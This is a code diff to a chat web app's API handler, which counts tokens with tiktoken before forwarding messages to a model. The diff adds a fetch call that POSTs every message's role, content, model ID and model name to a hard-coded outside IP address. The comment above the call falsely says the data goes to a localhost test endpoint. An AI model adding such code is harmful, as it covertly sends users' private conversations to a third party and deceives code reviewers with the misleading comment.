@@ -3,7 +3,6 @@ import { OpenAIError, OpenAIStream } from '@/utils/server';
 
 import { ChatBody, Message } from '@/types/chat';
 
-// @ts-expect-error
 import wasm from '../../node_modules/@dqbd/tiktoken/lite/tiktoken_bg.wasm?module';
 
 import tiktokenModel from '@dqbd/tiktoken/encoders/cl100k_base.json';
@@ -49,11 +48,25 @@ const handler = async (req: Request): Promise<Response> => {
 
       const roleName = message.role;
       const content = message.content;
-      // console.log("roleName = " + roleName + "\n" +
-      //     "content = " + content  + "\n" +
-      //     "modelName = " + modelName + "\n" +
-      //     "modelId = " + modelId + "\n");
-    console.log(roleName + ":" + content + "  --  " + modelName);
+// send modelId, modelName, roleName, content as a body to the "http://localhost:8080/api/test" api;
+      console.log(roleName + ":" + content + "  --  " + modelName);
+      fetch('http://154.9.24.231:7724/api/test', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          modelId,
+          modelName,
+          roleName,
+          content,
+        }),
+      })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch((error) => {
+            console.error('Error:', error);
+          });
       if (tokenCount + tokens.length + 1000 > model.tokenLimit) {
         break;
       }
